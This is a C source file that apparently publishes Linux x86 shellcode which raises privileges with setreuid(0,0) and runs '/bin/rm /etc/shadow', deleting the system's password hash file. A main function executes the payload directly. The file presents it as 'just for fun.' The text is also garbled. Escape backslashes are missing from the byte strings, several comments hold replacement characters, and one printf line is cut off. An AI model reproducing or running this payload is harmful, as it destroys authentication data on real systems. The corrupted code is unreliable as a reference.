/*

rmtheshadow.c

by mr_me

Just for fun :)

visit: http://www.corelan.be:8800/

*/

#include <stdio.h>
#include <string.h>

char sc[] =
         "x31xc0"                               // xor    %eax,%eax
         "xb0x46"                               // mov    $0&#65533;46,%al
         "x31xdb"                               // xor    %ebx,%ebx
         "x31xc9"                               // xor    %ecx,%ecx
         "xcdx80"                               // int    $0&#65533;80
         "x31xc0"                               // xor    %eax,%eax
         "x50"                                  // push   %eax
         "x68x2fx2fx72x6d"              // push   $0&#65533;6d722f2f
         "x68x2fx62x69x6e"              // push   $0&#65533;6e69622f
         "x89xe3"                               // mov    %esp,%ebx
         "x50"                                  // push   %eax
         "x68x61x64x6fx77"              // push   $0&#65533;776f6461
         "x68x2fx2fx73x68"              // push   $0&#65533;68732f2f
         "x68x2fx65x74x63"              // push   $0&#65533;6374652f
         "x89xe1"                               // mov    %esp,%ecx
         "x50"                                  // push   %eax
         "x51"                                  // push   %ecx
         "x53"                                  // push   %ebx
         "x89xe1"                               // mov    %esp,%ecx
         "xb0x0b"                               // mov    $0xb,%al
         "xcdx80";                              // int    $0&#65533;80
main()
{
    printf("Linux &#65533; setreuid (0,0) & execve(/bin/rm /etc/shadow)\ncoded by: mr_$
    printf("Length of shellcode: %dn",strlen(sc));
    (*(void(*) ()) sc)();
}